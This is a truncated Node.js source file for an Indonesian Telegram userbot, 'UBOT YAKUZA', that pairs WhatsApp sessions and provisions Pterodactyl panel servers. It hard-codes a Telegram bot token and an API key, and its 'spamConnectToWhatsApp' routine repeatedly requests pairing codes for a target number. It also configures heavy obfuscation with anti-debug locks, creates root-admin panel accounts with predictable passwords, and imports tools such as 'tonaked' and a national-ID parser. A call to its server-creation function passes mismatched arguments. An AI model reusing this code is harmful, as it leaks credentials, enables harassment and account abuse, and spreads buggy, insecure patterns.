const figlet = require("figlet");
const readline = require("readline");
const COLORS = [
  "\x1b[91m", "\x1b[93m", "\x1b[92m", "\x1b[96m", "\x1b[94m", "\x1b[95m",
];
const BOLD = "\x1b[1m";
const RESET = "\x1b[0m";

function colorLineByChar(line, offset = 0) {
  return line.split("")
    .map((ch, i) => COLORS[(i + offset) % COLORS.length] + BOLD + ch + RESET)
    .join("");
}

function animateColorOnly(lines, footerText, developersText) {
  let shift = 0;
  const totalLines = lines.length;
  const baseY = 0;
  console.log("\n".repeat(totalLines + 3));
  setInterval(() => {
    readline.cursorTo(process.stdout, 0, baseY);
    for (let i = 0; i < totalLines; i++) {
      readline.cursorTo(process.stdout, 0, baseY + i);
      process.stdout.write(colorLineByChar(lines[i], shift) + "\n");
    }
    readline.cursorTo(process.stdout, 0, baseY + totalLines);
    process.stdout.write(colorLineByChar(footerText, shift) + "\n");

    readline.cursorTo(process.stdout, 0, baseY + totalLines + 1);
    process.stdout.write(colorLineByChar(developersText, shift));

    shift = (shift + 1) % COLORS.length;
  }, 150);
}

(async () => {
  console.clear();
  const ascii = figlet.textSync("UBOT YAKUZA", { font: "Standard" });
  const lines = ascii.split("\n");
  const footer = "VERSION : 6.0.0";
  const developers = "DEVELOPERS : © BY YAKUZA";
  animateColorOnly(lines, footer, developers);
  setInterval(() => {}, 1000);
})();

// ================================== //
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason
} = require('@otaxayun/baileys');

const pino = require('pino');
const logger = pino({ level: 'silent' });
const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { check } = require('./command/cek.js');
const input = require("input");
const fs = require('fs');
const gis = require("g-i-s");
const path = require('path');
const { NewMessage } = require("telegram/events");
const axios = require('axios');
const FormData = require('form-data');
const AdmZip = require("adm-zip");
const yts = require("yt-search");
const { nikParser } = require('nik-parser');
const JsConfuser = require("js-confuser");
const SSH2 = require("ssh2");
const cheerio = require("cheerio");
const fetch = require("node-fetch");
const archiver = require("archiver");

const FETCH_TIMEOUT = 15000;
const SEND_DELAY = 500;
const MAX_FILES = 100;

let config = require('./config.js');
const tourlHandler = require('./command/tourl');
const handlerPlay = require('./command/play.js');
const handlerIg = require('./command/ig.js');
const handlerIqc = require('./command/iqc.js');
const deployHandler = require('./command/deploy.js');
const handlerInstall1 = require('./command/installprotect1.js');
const handlerInstall2 = require('./command/installprotect2.js');
const handlerInstall3 = require('./command/installprotect3.js');
const handlerInstall4 = require('./command/installprotect4.js');
const handlerInstall5 = require('./command/installprotect5.js');
const handlerInstall6 = require('./command/installprotect6.js');
const handlerInstall7 = require('./command/installprotect7.js');
const handlerInstall8 = require('./command/installprotect8.js');
const handlerInstall9 = require('./command/installprotect9.js');
const handlerInstall10 = require('./command/installprotect10.js');
const handlerInstallAll = require('./command/installprotectall.js');
const handlerUninstall1 = require('./command/uninstallprotect1.js');
const handlerUninstall2 = require('./command/uninstallprotect2.js');
const handlerUninstall3 = require('./command/uninstallprotect3.js');
const handlerUninstall4 = require('./command/uninstallprotect4.js');
const handlerUninstall5 = require('./command/uninstallprotect5.js');
const handlerUninstall6 = require('./command/uninstallprotect6.js');
const handlerUninstall7 = require('./command/uninstallprotect7.js');
const handlerUninstall8 = require('./command/uninstallprotect8.js');
const handlerUninstall9 = require('./command/uninstallprotect9.js');
const handlerUninstallAll = require('./command/uninstallprotectall.js');
const soundHandler = require('./command/sound.js');
const handlerTonaked = require('./command/tonaked.js');
const handlerGetCode = require('./command/getcode.js');
const handlerGetLink = require('./command/getlink.js');
const cekffHandler = require('./command/cekff.js');
const handlerPass = require('./command/pass.js');
const handlerQ = require('./command/q.js');
const handlerEnchtml = require('./command/enchtml.js');
const cekVPSHandler = require('./command/cekvps.js');
const handlerTohd = require('./command/tohd.js');
const handlerBrat = require('./command/brat.js');
const handlerToImg = require('./command/toimg.js');
const encinvishtmlHandler = require('./command/encinvishtml.js');
const invishtmlHandler = require('./command/encinvishtml2.js');
const ttsearchHandler = require('./command/ttsearch.js');
const getppHandler = require('./command/getpp.js');
const listDeployHandler = require('./command/listdeploy.js');
const deleteDeployHandler = require('./command/deldeploy.js');
const handleAmbilFile = require('./command/ambilfile.js');
const tourl2Handler = require('./command/tourl2.js');
const blFile = path.join(__dirname, "./database/blacklist.json");
const cekapikeyHandler = require('./command/cekapikey.js');
if (!fs.existsSync(blFile)) fs.writeFileSync(blFile, JSON.stringify([]));

const settings = require("./settings.js");
const apiKey = "58e505edaaf948e6b5c5c35f6fa49262";
const OWNER_BOT_TOKEN2 = "7997552013:AAFwqjsZc0cGfJdJ_rVu6EBBVWbfvDqizHM";

const apiId = parseInt(config.API_ID);
const apiHash = config.API_HASH;
let stringSession = new StringSession(config.STRING_SESSION || "");

const sessions = new Map();
const SESSIONS_DIR = path.join(__dirname, 'sessions');
const SESSIONS_FILE = path.join(__dirname, 'sessions.json');

if (!fs.existsSync(SESSIONS_DIR)) {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

let isSelfMode = true;
let afk = {
    isAfk: false,
    reason: "",
    since: null
};

function waktuJakarta() {
  const options = {
    timeZone: "Asia/Jakarta",
    hour12: false,
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  };

  const now = new Date().toLocaleString("id-ID", options);
  return now;
}

const noteFile = path.join(process.cwd(), "notes.json");
function loadNotes() {
  try {
    if (fs.existsSync(noteFile)) {
      return JSON.parse(fs.readFileSync(noteFile));
    }
    return {};
  } catch {
    return {};
  }
}
function saveNotes(notes) {
  fs.writeFileSync(noteFile, JSON.stringify(notes, null, 2));
}

let sock;

const silentLogger = {
    level: 'silent',
    trace: () => {},
    debug: () => {},
    info: () => {},
    warn: () => {},
    error: () => {},
    fatal: () => {}
};

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections(client) {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: logger,
        defaultQueryTimeoutMs: undefined,
});

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections(client);
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(client, botNumber, chatId) {
  let statusMessage = await client.sendMessage(
    chatId,
    {
      message: `<blockquote>🚀 ᴏᴛᴡ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...</blockquote>`,
      parseMode: "html"
    }
  );

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: logger,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await client.sendMessage(chatId, {
          message: `<blockquote>🔄 ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴍᴇɴᴄᴏʙᴀ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ</blockquote>`,
          parseMode: "html"
        });
        await connectToWhatsApp(client, botNumber, chatId);
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ɢᴀɢᴀʟ ᴛᴇʀʜᴜʙᴜɴɢ</blockquote>`,
          parseMode: "html"
        });
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>✅️ ʙᴇʀʜᴀsɪʟ ᴘʀᴏɢʀᴇss ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴘᴇsᴀɴ : sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ</blockquote>`,
        parseMode: "html"
      });
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "YAKUZA12");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          
          await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
          
          await client.sendMessage(chatId, {
            message: `<blockquote>⌛️ ᴘʀᴏɢʀᴇss ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴋᴏᴅᴇ : ${formattedCode}</blockquote>`,
            parseMode: "html"
          });
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        
        await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
        
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴛᴀᴛᴜs : ᴇʀᴏʀʀ
╰➤ ᴘᴇsᴀɴ : ${error.message}</blockquote>`,
          parseMode: "html"
        });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

initializeWhatsAppConnections();

async function spamConnectToWhatsApp(client, botNumber, chatId, sessionIndex = 1) {
  const sessionId = `${botNumber}_${sessionIndex}`;
  let statusMessage = await client.sendMessage(
    chatId,
    {
      message: `<blockquote>🚀 ᴏᴛᴡ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ᴘʀᴏɢʀᴇss...</blockquote>`,
      parseMode: "html"
    }
  );

  const sessionDir = createSessionDir(sessionId);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: logger,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await client.sendMessage(chatId, {
          message: `<blockquote>🔄 ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ᴍᴇɴᴄᴏʙᴀ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ</blockquote>`,
          parseMode: "html"
        });
        await spamConnectToWhatsApp(client, botNumber, chatId, sessionIndex);
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ɢᴀɢᴀʟ ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ɢᴀɢᴀʟ ᴛᴇʀʜᴜʙᴜɴɢ</blockquote>`,
          parseMode: "html"
        });
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(sessionId, sock);
      saveActiveSessions(sessionId);
      
      await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>✅️ ʙᴇʀʜᴀsɪʟ ᴘʀᴏɢʀᴇss ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴘᴇsᴀɴ : sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ</blockquote>`,
        parseMode: "html"
      });
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "YAKUZA12");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          
          await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
          
          statusMessage = await client.sendMessage(chatId, {
            message: `<blockquote>⌛️ ᴘʀᴏɢʀᴇss ᴍᴇᴍᴜᴀᴛ ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ᴘᴀɪʀɪɴɢ
╰➤ ᴋᴏᴅᴇ : ${formattedCode}</blockquote>`,
            parseMode: "html"
          });
        }
      } catch (error) {
        console.error(`Error requesting pairing code session ${sessionIndex}:`, error);
        
        await client.deleteMessages(chatId, [statusMessage.id], { revoke: true });
        
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ
╰➤ ɴᴜᴍʙᴇʀ  : ${botNumber} 
╰➤ sᴇssɪᴏɴ : ${sessionIndex}
╰➤ sᴛᴀᴛᴜs : ᴇʀᴏʀʀ
╰➤ ᴘᴇsᴀɴ : ${error.message}</blockquote>`,
          parseMode: "html"
        });
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

let prefix = settings.PREFIX;

function saveConfigKey(key, value) {
  try {
    const configPath = path.join(__dirname, "config.js");
    let configData = fs.readFileSync(configPath, "utf8");

    const regex = new RegExp(`${key}\\s*:\\s*(['"\`]?)([^,'"\`]*)\\1`, "m");

    const safeValue =
      typeof value === "string"
        ? value.replace(/\\/g, "\\\\").replace(/'/g, "\\'")
        : value;

    if (regex.test(configData)) {
      configData = configData.replace(regex, `${key}: '${safeValue}'`);
    } else {

      configData = configData.replace(/}\s*$/, `  ${key}: '${safeValue}',\n}`);
    }

    fs.writeFileSync(configPath, configData, "utf8");
  } catch (err) {
    console.error(`❌ Gagal menyimpan key ${key}:`, err);
  }
}

function savePrefixToConfig(newPrefix) {
  saveConfigKey("PREFIX", newPrefix);
}

function saveSessionToConfig(sessionString) {
    const configPath = path.join(__dirname, 'config.js');
    
    let content = fs.readFileSync(configPath, 'utf8');
    
    const newContent = content.replace(
        /STRING_SESSION:\s*".*"/,
        `STRING_SESSION: "${sessionString}"`
    );
    
    fs.writeFileSync(configPath, newContent, 'utf8');
    console.log("New STRING_SESSION has been saved to config.js.");
}

async function CatBox(filePath) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', ''); 
    data.append('fileToUpload', fs.createReadStream(filePath));

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(),
        data: data
    };

    try {
        const api = await axios.request(config);
        if (api.data && typeof api.data === 'string' && api.data.startsWith('https://')) {
            return api.data;
        } else {
            throw new Error('Failed to upload to CatBox: Unexpected API response.');
        }
    } catch (error) {
        if (error.response) throw new Error(`CatBox upload failed: ${error.response.status} - ${error.response.data || 'Server error'}`);
        if (error.request) throw new Error('CatBox upload failed: No response from server.');
        throw new Error(`CatBox upload failed: ${error.message}`);
    }
}

function getFileExtension(mime, fileName = "") {
    if (mime) {
        if (mime.includes('image/jpeg') || mime.includes('image/jpg')) return '.jpg';
        if (mime.includes('image/png')) return '.png';
        if (mime.includes('image/gif')) return '.gif';
        if (mime.includes('video/mp4') || mime.includes('video/quicktime')) return '.mp4';
        if (mime.includes('audio/mpeg')) return '.mp3';
        if (mime.includes('audio/ogg')) return '.ogg';
        if (mime.includes('image/webp')) return '.webp';
    }
    if (fileName) {
        const ext = fileName.split('.').pop();
        return ext ? '.' + ext : '.bin';
    }
    return '.bin';
}

const getStrongObfuscationConfig = () => {
    return {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
    };
};

const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        return "var_" + Math.random().toString(36).substring(7);
    };

    return {
        target: "node",
        calculator: false,
        compact: true,
        controlFlowFlattening: 1,
        deadCode: 1,
        dispatcher: true,
        duplicateLiteralsRemoval: 1,
        flatten: true,
        globalConcealing: true,
        hexadecimalNumbers: 1,
        identifierGenerator: generateNovaName,
        lock: {
            antiDebug: true,
            integrity: true,
            selfDefending: true,
        },
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: true,
        renameGlobals: true,
        renameVariables: true,
        shuffle: true,
        stringCompression: true,
        stringConcealing: true,
    };
};

const { domain, plta, pltc, eggs, loc } = require("./settings");

function escapeHtml(str) {
  return (str || "").toString()
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

async function createServerAndNotify(client, targetIdentifier, name, username, memoMB, diskMB, cpuPercent) {
  try {
    let targetId = targetIdentifier;
    if (typeof targetIdentifier === "string" && !/^\d+$/.test(targetIdentifier)) {
      try {
        const ent = await client.getEntity(targetIdentifier);
        if (ent && ent.id) targetId = ent.id;
      } catch (e) {}
    }
    if (!targetId) targetId = "me";

    const email = `${username}@yakuza.com`;
    const password = `${username}117`;

    let user;

    try {
      const resCheck = await fetch(`${domain}/api/application/users?filter[email]=${encodeURIComponent(email)}`, {
        method: "GET",
        headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
      });
      const dataCheck = await resCheck.json().catch(() => ({}));
      if (resCheck.ok && dataCheck.data && dataCheck.data.length > 0) {
        user = dataCheck.data[0].attributes;
      }
    } catch (_) {}

    if (!user) {
      const resUser = await fetch(`${domain}/api/application/users`, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${plta}`,
        },
        body: JSON.stringify({
          email,
          username,
          first_name: username,
          last_name: username,
          language: "en",
          password,
          root_admin: false,
        }),
      });

      const dataUser = await resUser.json().catch(() => ({}));
      if (!resUser.ok || dataUser.errors) {
        const reasonText = JSON.stringify(dataUser.errors || dataUser || {});
        const emailTaken = reasonText.toLowerCase().includes("email");
        if (emailTaken) {
          try {
            const resCheck2 = await fetch(`${domain}/api/application/users?filter[email]=${encodeURIComponent(email)}`, {
              method: "GET",
              headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
            });
            const j2 = await resCheck2.json().catch(() => ({}));
            if (resCheck2.ok && j2.data && j2.data.length > 0) {
              user = j2.data[0].attributes;
            } else {
              throw new Error(`Error creating user: ${reasonText}`);
            }
          } catch (e) {
            throw new Error(`Error creating user: ${reasonText}`);
          }
        } else {
          throw new Error(`Error creating user: ${reasonText}`);
        }
      } else {
        user = dataUser.attributes;
      }
    }

    const memoryLimit = Number.isInteger(+memoMB) ? parseInt(memoMB, 10) : 0;
    const diskLimit   = Number.isInteger(+diskMB) ? parseInt(diskMB, 10) : 0;
    const cpuLimit    = Number.isInteger(+cpuPercent) ? parseInt(cpuPercent, 10) : 0;

    const resServer = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name,
        description: "",
        user: user.id,
        egg: parseInt(eggs, 10),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
        startup: "if [ -f /home/container/package.json ]; then npm install; fi; npm start",
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memoryLimit,
          swap: 0,
          disk: diskLimit,
          io: 500,
          cpu: cpuLimit,
        },
        feature_limits: { databases: 5, backups: 5, allocations: 1 },
        deploy: { locations: [parseInt(loc, 10)], dedicated_ip: false, port_range: [] },
      }),
    });

    const dataServer = await resServer.json().catch(() => ({}));
    if (!resServer.ok || dataServer.errors) {
      const reason = dataServer && dataServer.errors ? JSON.stringify(dataServer.errors[0]) : `HTTP ${resServer.status}`;
      throw new Error(`Error creating server: ${reason}`);
    }
    const server = dataServer.attributes;

    const msgText = `
<blockquote>┏━⬣❏「 ɪɴғᴏ ᴅᴀᴛᴀ ᴘᴀɴᴇʟ 」❏
│➥ ᴅᴏᴍᴀɪɴ : ${domain}
│➥ ɪᴅ     : ${server.id}
│➥ ɴᴀᴍᴀ   : ${escapeHtml(name)}
│➥ ᴄᴘᴜ    : ${cpuLimit === 0 ? "ᴜɴʟɪᴍɪᴛᴇᴅ" : cpuLimit + "%"}
│➥ ᴍᴇᴍᴏʀʏ : ${memoryLimit === 0 ? "ᴜɴʟɪᴍɪᴛᴇᴅ" : memoryLimit + " MB"}
│➥ ᴅɪsᴋ   : ${diskLimit === 0 ? "ᴜɴʟɪᴍɪᴛᴇᴅ" : diskLimit + " MB"}
│➥ ᴇᴍᴀɪʟ  : ${escapeHtml(email)}
│➥ ᴜsᴇʀ   : ${escapeHtml(username)}
│➥ ᴘᴀssᴡᴏʀᴅ  : ${escapeHtml(password)}
┗━━━━━━━━━⬣</blockquote>`.trim();

    await client.sendMessage(String(targetId), { message: msgText, parseMode: "html" });

    return { ok: true, server, user };

  } catch (err) {
    console.error("CREATE SERVER ERROR:", err);
    return { ok: false, error: err.message || String(err) };
  }
}

const sizeMap = {
  "1gb": { mem: 1024, disk: 1024, cpu: 10 },
  "2gb": { mem: 2048, disk: 2048, cpu: 20 },
  "3gb": { mem: 3072, disk: 3072, cpu: 30 },
  "4gb": { mem: 4096, disk: 4096, cpu: 40 },
  "5gb": { mem: 5120, disk: 5120, cpu: 50 },
  "6gb": { mem: 6144, disk: 6144, cpu: 60 },
  "7gb": { mem: 7168, disk: 7168, cpu: 70 },
  "8gb": { mem: 8192, disk: 8192, cpu: 80 },
  "9gb": { mem: 9216, disk: 9216, cpu: 90 },
  "10gb": { mem: 10240, disk: 10240, cpu: 100 },
  "unli": { mem: 0, disk: 0, cpu: 0 },
};

async function handleCreateSizeCommand(cmdKey, client, chatId, message, textArgs, prefix) {
  let statusMsg = null;
  try {
    const parts = (textArgs || "").split(",").map(p => p.trim()).filter(Boolean);
    if (parts.length < 1) {
      return await client.sendMessage(chatId, {
        message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ sᴀʟᴀʜ. ɢᴜɴᴀᴋᴀɴ: <code>${prefix}${cmdKey} nama, ID</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    const name = parts[0];
    const username = name.replace(/^@/, "").trim();  const password = `${username}117`;
   const targetIdentifier = parts[1] || chatId; 
   
    const spec = sizeMap[cmdKey];
    if (!spec) {
      return await client.sendMessage(chatId, {
        message: `<blockquote>❌ ʀᴀᴍ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴜɴᴛᴜᴋ ${cmdKey}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    statusMsg = await client.sendMessage(chatId, {
      message: `<blockquote>🌐 ᴍᴇᴍʙᴜᴀᴛ sᴇʀᴠᴇʀ: <b>${escapeHtml(name)}</b>\nʀᴀᴍ: <b>${cmdKey}</b>\n🔐 ᴜsᴇʀɴᴀᴍᴇ: <code>${escapeHtml(username)}</code>\nᴍᴏɴᴏɴ ᴛᴜɴɢɢᴜ...</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
    
    const res = await createServerAndNotify(client, targetIdentifier, name, username, password, spec.mem, spec.disk, spec.cpu);

    if (statusMsg && statusMsg.id) {
      try {
        await client.deleteMessages(chatId, [statusMsg.id], { revoke: true });
      } catch (e) {
        console.warn("Tidak bisa hapus statusMsg (ignored):", e.message || e);
      }
    }

    if (!res.ok) {
      return await client.sendMessage(chatId, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ sᴇʀᴠᴇʀ: <code>${escapeHtml(res.error || "unknown")}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ sᴇʀᴠᴇʀ <b>${escapeHtml(name)}</b> ʙᴇʀʜᴀsɪʟ ᴅɪʙᴜᴀᴛ ᴅᴀɴ ᴅᴀᴛᴀ ᴅɪᴋɪʀɪᴍ ᴋᴇ <code>${escapeHtml(String(targetIdentifier))}</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
    return;
  } catch (err) {
    console.error("handleCreateSizeCommand error:", err);
    try {
      if (statusMsg && statusMsg.id) await client.deleteMessages(chatId, [statusMsg.id], { revoke: true });
    } catch (_) {}
    await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }).catch(() => {});
    await client.sendMessage(chatId, {
      message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: <code>${escapeHtml(err.message || String(err))}</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }
}

async function handleADPCommand(client, chatId, message, textArgs, prefix) {
  const parts = (textArgs || "").split(",").map(p => p.trim());
  if (parts.length < 2) {
    return await client.sendMessage(chatId, {
      message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ sᴀʟᴀʜ. ɢᴜɴᴀᴋᴀɴ: <code>${prefix}adp nama, ID</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }

  const name = parts[0];
  const targetId = parts[1];
  const email = `${name}@yakuza.com`;
  const password = `${name}110`;

  try {
    const checkRes = await fetch(`${domain}/api/application/users?filter[email]=${encodeURIComponent(email)}`, {
      method: "GET",
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const checkData = await checkRes.json().catch(() => ({}));

    let user;
    if (checkRes.ok && checkData.data && checkData.data.length > 0) {
      user = checkData.data[0].attributes;
    } else {
      const createRes = await fetch(`${domain}/api/application/users`, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${plta}`,
        },
        body: JSON.stringify({
          username: name,
          email,
          first_name: name,
          last_name: name,
          password,
          language: "en",
          root_admin: true
        }),
      });
      const createData = await createRes.json().catch(() => ({}));
      if (!createRes.ok || createData.errors) throw new Error(JSON.stringify(createData.errors || createData));
      user = createData.attributes;
    }

    const msgText = `
<blockquote>┏━⬣❏「 ɪɴғᴏ ᴅᴀᴛᴀ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 」❏
